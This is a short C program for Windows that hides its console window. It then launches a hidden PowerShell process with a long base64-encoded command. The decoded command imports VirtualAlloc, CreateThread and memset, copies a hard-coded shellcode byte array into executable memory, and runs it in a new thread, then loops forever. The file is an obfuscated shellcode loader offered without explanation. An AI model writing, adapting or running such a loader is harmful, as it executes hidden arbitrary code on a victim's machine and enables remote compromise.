#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <aclapi.h>
#include <shlobj.h>
#include <windows.h>
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
int main(int argc, char *argv[])
{
FreeConsole();
 ShellExecute( NULL,NULL, "powershell.exe", "powershell -window hidden -enc JABWAGoANwAgAD0AIAAnACQAcgAyAEsAIAA9ACAAJwAnAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbABsACIAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAVgBpAHIAdAB1AGEAbABBAGwAbABvAGMAKABJAG4AdABQAHQAcgAgAGwAcABBAGQAZAByAGUAcwBzACwAIAB1AGkAbgB0ACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABmAGwAQQBsAGwAbwBjAGEAdABpAG8AbgBUAHkAcABlACwAIAB1AGkAbgB0ACAAZgBsAFAAcgBvAHQAZQBjAHQAKQA7AFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbABsACIAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAQwByAGUAYQB0AGUAVABoAHIAZQBhAGQAKABJAG4AdABQAHQAcgAgAGwAcABUAGgAcgBlAGEAZABBAHQAdAByAGkAYgB1AHQAZQBzACwAIAB1AGkAbgB0ACAAZAB3AFMAdABhAGMAawBTAGkAegBlACwAIABJAG4AdABQAHQAcgAgAGwAcABTAHQAYQByAHQAQQBkAGQAcgBlAHMAcwAsACAASQBuAHQAUAB0AHIAIABsAHAAUABhAHIAYQBtAGUAdABlAHIALAAgAHUAaQBuAHQAIABkAHcAQwByAGUAYQB0AGkAbwBuAEYAbABhAGcAcwAsACAASQBuAHQAUAB0AHIAIABsAHAAVABoAHIAZQBhAGQASQBkACkAOwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBtAHMAdgBjAHIAdAAuAGQAbABsACIAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAbQBlAG0AcwBlAHQAKABJAG4AdABQAHQAcgAgAGQAZQBzAHQALAAgAHUAaQBuAHQAIABzAHIAYwAsACAAdQBpAG4AdAAgAGMAbwB1AG4AdAApADsAJwAnADsAJAB3ACAAPQAgAEEAZABkAC0AVAB5AHAAZQAgAC0AbQBlAG0AYgBlAHIARABlAGYAaQBuAGkAdABpAG8AbgAgACQAcgAyAEsAIAAtAE4AYQBtAGUAIAAiAFcAaQBuADMAMgAiACAALQBuAGEAbQBlAHMAcABhAGMAZQAgAFcAaQBuADMAMgBGAHUAbgBjAHQAaQBvAG4AcwAgAC0AcABhAHMAcwB0AGgAcgB1ADsAWwBCAHkAdABlAFsAXQBdADsAWwBCAHkAdABlAFsAXQBdACQAegAgAD0AIAAwAHgAYgA4ACwAMAB4ADcANAAsADAAeABhADAALAAwAHgAOQA0ACwAMAB4ADYAOAAsADAAeABkADkALAAwAHgAZQBjACwAMAB4AGQAOQAsADAAeAA3ADQALAAwAHgAMgA0ACwAMAB4AGYANAAsADAAeAA1AGUALAAwAHgAMgBiACwAMAB4AGMAOQAsADAAeABiADEALAAwAHgANAA3ACwAMAB4ADMAMQAsADAAeAA0ADYALAAwAHgAMQAzACwAMAB4ADAAMwAsADAAeAA0ADYALAAwAHgAMQAzACwAMAB4ADgAMwAsADAAeABjADYALAAwAHgANwAwACwAMAB4ADQAMgAsADAAeAA2ADEALAAwAHgAOQA0ACwAMAB4ADkAMAAsADAAeAAwADAALAAwAHgAOABhACwAMAB4ADYANQAsADAAeAA2ADAALAAwAHgANgA1ACwAMAB4ADAAMgAsADAAeAA4ADAALAAwAHgANQAxACwAMAB4AGEANQAsADAAeAA3ADAALAAwAHgAYwAwACwAMAB4AGMAMQAsADAAeAAxADUALAAwAHgAZgAyACwAMAB4ADgANAAsADAAeABlAGQALAAwAHgAZABlACwAMAB4ADUANgAsADAAeAAzAGQALAAwAHgANgA2ACwAMAB4ADkAMgAsADAAeAA3AGUALAAwAHgAMwAyACwAMAB4AGMAZgAsADAAeAAxADkALAAwAHgANQA5ACwAMAB4ADcAZAAsADAAeABkADAALAAwAHgAMwAyACwAMAB4ADkAOQAsADAAeAAxAGMALAAwAHgANQAyACwAMAB4ADQAOQAsADAAeABjAGUALAAwAHgAZgBlACwAMAB4ADYAYgAsADAAeAA4ADIALAAwAHgAMAAzACwAMAB4AGYAZQAsADAAeABhAGMALAAwAHgAZgBmACwAMAB4AGUAZQAsADAAeAA1ADIALAAwAHgANgA1ACwAMAB4ADgAYgAsADAAeAA1AGQALAAwAHgANAAzACwAMAB4ADAAMgAsADAAeABjADEALAAwAHgANQBkACwAMAB4AGUAOAAsADAAeAA1ADgALAAwAHgAYwA3ACwAMAB4AGUANQAsADAAeAAwAGQALAAwAHgAMgA4ACwAMAB4AGUANgAsADAAeABjADQALAAwAHgAOAAzACwAMAB4ADIAMwAsADAAeABiADEALAAwAHgAYwA2ACwAMAB4ADIAMgAsADAAeABlADAALAAwAHgAYwA5ACwAMAB4ADQAZQAsADAAeAAzAGQALAAwAHgAZQA1ACwAMAB4AGYANAAsADAAeAAxADkALAAwAHgAYgA2ACwAMAB4AGQAZAAsADAAeAA4ADMALAAwAHgAOQBiACwAMAB4ADEAZQAsADAAeAAyAGMALAAwAHgANgBiACwAMAB4ADMANwAsADAAeAA1AGYALAAwAHgAOAAxACwAMAB4ADkAZQAsADAAeAA0ADkALAAwAHgAYQA3ACwAMAB4ADIANQAsADAAeAA0ADEALAAwAHgAMwBjACwAMAB4AGQAMQAsADAAeAA1ADYALAAwAHgAZgBjACwAMAB4ADQANwAsADAAeAAyADYALAAwAHgAMgA1ACwAMAB4AGQAYQAsADAAeABjADIALAAwAHgAYgBkACwAMAB4ADgAZAAsADAAeABhADkALAAwAHgANwA1ACwAMAB4ADEAYQAsADAAeAAyAGMALAAwAHgANwBkACwAMAB4AGUAMwAsADAAeABlADkALAAwAHgAMgAyACwAMAB4AGMAYQAsADAAeAA2ADcALAAwAHgAYgA1ACwAMAB4ADIANgAsADAAeABjAGQALAAwAHgAYQA0ACwAMAB4AGMAZAAsADAAeAA1ADIALAAwAHgANAA2ACwAMAB4ADQAYgAsADAAeAAwADIALAAwAHgAZAAzACwAMAB4ADEAYwAsADAAeAA2ADgALAAwAHgAOAA2ACwAMAB4AGIAOAAsADAAeABjADcALAAwAHgAMQAxACwAMAB4ADkAZgAsADAAeAA2ADQALAAwAHgAYQA5ACwAMAB4ADIAZQAsADAAeABmAGYALAAwAHgAYwA3ACwAMAB4ADEANgAsADAAeAA4AGIALAAwAHgAOABiACwAMAB4AGUANQAsADAAeAA0ADMALAAwAHgAYQA2ACwAMAB4AGQAMQAsADAAeAA2ADEALAAwAHgAYQA3ACwAMAB4ADgAYgAsADAAeABlADkALAAwAHgANwAxACwAMAB4AGEAZgAsADAAeAA5AGMALAAwAHgAOQBhACwAMAB4ADQAMwAsADAAeAA3ADAALAAwAHgAMwA3ACwAMAB4ADMANQAsADAAeABlAGYALAAwAHgAZgA5ACwAMAB4ADkAMQAsADAAeABjADIALAAwAHgAMQAwACwAMAB4AGQAMAAsADAAeAA2ADYALAAwAHgANQBjACwAMAB4AGUAZgAsADAAeABkAGIALAAwAHgAOQA2ACwAMAB4ADcANAAsADAAeAAyAGIALAAwAHgAOABmACwAMAB4AGMANgAsADAAeABlAGUALAAwAHgAOQBhACwAMAB4AGIAMAAsADAAeAA4AGMALAAwAHgAZQBlACwAMAB4ADIAMwAsADAAeAA2ADUALAAwAHgAMwA4ACwAMAB4AGUAYQAsADAAeABiADMALAAwAHgANAA2ACwAMAB4ADEANQAsADAAeABmADUALAAwAHgANQA2ACwAMAB4ADIAZgAsADAAeAA2ADQALAAwAHgAZgA2ACwAMAB4ADQAOQAsADAAeABmADMALAAwAHgAZQAxACwAMAB4ADEAMAAsADAAeAAzADkALAAwAHgANQBiACwAMAB4AGEAMgAsADAAeAA4AGMALAAwAHgAZgA5ACwAMAB4ADAAYgAsADAAeAAwADIALAAwAHgANwBkACwAMAB4ADkAMQAsADAAeAA0ADEALAAwAHgAOABkACwAMAB4AGEAMgAsADAAeAA4ADEALAAwAHgANgA5ACwAMAB4ADQANwAsADAAeABjAGIALAAwAHgAMgBiACwAMAB4ADgANgAsADAAeAAzAGUALAAwAHgAYQAzACwAMAB4AGMAMwAsADAAeAAzAGYALAAwAHgAMQBiACwAMAB4ADMAZgAsADAAeAA3ADIALAAwAHgAYgBmACwAMAB4AGIAMQAsADAAeAA0ADUALAAwAHgAYgA0ACwAMAB4ADQAYgAsADAAeAAzADYALAAwAHgAYgA5ACwAMAB4ADcAYQAsADAAeABiAGMALAAwAHgAMwAzACwAMAB4AGEAOQAsADAAeABlAGEALAAwAHgANABjACwAMAB4ADAAZQAsADAAeAA5ADMALAAwAHgAYgBjACwAMAB4ADUAMwAsADAAeABhADQALAAwAHgAYgBlACwAMAB4ADQAMAAsADAAeABjADYALAAwAHgANAAzACwAMAB4ADYAOQAsADAAeAAxADcALAAwAHgANwBlACwAMAB4ADQAZQAsADAAeAA0AGMALAAwAHgANQBmACwAMAB4ADIAMQAsADAAeABiADEALAAwAHgAYgBiACwAMAB4AGQANAAsADAAeABlADgALAAwAHgAMgA3ACwAMAB4ADAANAAsADAAeAA4ADIALAAwAHgAMQA0ACwAMAB4AGEAOAAsADAAeAA4ADQALAAwAHgANQAyACwAMAB4ADQAMwAsADAAeABhADIALAAwAHgAOAA0ACwAMAB4ADMAYQAsADAAeAAzADMALAAwAHgAOQA2ACwAMAB4AGQANgAsADAAeAA1AGYALAAwAHgAMwBjACwAMAB4ADAAMwAsADAAeAA0AGIALAAwAHgAYwBjACwAMAB4AGEAOQAsADAAeABhAGMALAAwAHgAMwBhACwAMAB4AGEAMQAsADAAeAA3AGEALAAwAHgAYwA1ACwAMAB4AGMAMAAsADAAeAA5AGMALAAwAHgANABkACwAMAB4ADQAYQAsADAAeAAzAGEALAAwAHgAYwBiACwAMAB4ADQAZgAsADAAeABiADYALAAwAHgAZQBkACwAMAB4ADMANQAsADAAeAAzAGEALAAwAHgAZAA2ACwAMAB4ADIAZAA7ACQAZwAgAD0AIAAwAHgAMQAwADAAMAA7AGkAZgAgACgAJAB6AC4ATABlAG4AZwB0AGgAIAAtAGcAdAAgADAAeAAxADAAMAAwACkAewAkAGcAIAA9ACAAJAB6AC4ATABlAG4AZwB0AGgAfQA7ACQAZgBTAGQAPQAkAHcAOgA6AFYAaQByAHQAdQBhAGwAQQBsAGwAbwBjACgAMAAsADAAeAAxADAAMAAwACwAJABnACwAMAB4ADQAMAApADsAZgBvAHIAIAAoACQAaQA9ADAAOwAkAGkAIAAtAGwAZQAgACgAJAB6AC4ATABlAG4AZwB0AGgALQAxACkAOwAkAGkAKwArACkAIAB7ACQAdwA6ADoAbQBlAG0AcwBlAHQAKABbAEkAbgB0AFAAdAByAF0AKAAkAGYAUwBkAC4AVABvAEkAbgB0ADMAMgAoACkAKwAkAGkAKQAsACAAJAB6AFsAJABpAF0ALAAgADEAKQB9ADsAJAB3ADoAOgBDAHIAZQBhAHQAZQBUAGgAcgBlAGEAZAAoADAALAAwACwAJABmAFMAZAAsADAALAAwACwAMAApADsAZgBvAHIAIAAoADsAOwApAHsAUwB0AGEAcgB0AC0AcwBsAGUAZQBwACAANgAwAH0AOwAnADsAJABlACAAPQAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAkAFYAagA3ACkAKQA7ACQAawBMAFYAIAA9ACAAIgAtAGUAbgBjACAAIgA7AGkAZgAoAFsASQBuAHQAUAB0AHIAXQA6ADoAUwBpAHoAZQAgAC0AZQBxACAAOAApAHsAJAA0AGoAVQBuACAAPQAgACQAZQBuAHYAOgBTAHkAcwB0AGUAbQBSAG8AbwB0ACAAKwAgACIAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAiADsAaQBlAHgAIAAiACYAIAAkADQAagBVAG4AIAAkAGsATABWACAAJABlACIAfQBlAGwAcwBlAHsAOwBpAGUAeAAgACIAJgAgAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAkAGsATABWACAAJABlACIAOwB9AA==",NULL,NULL);
exit(0);
}
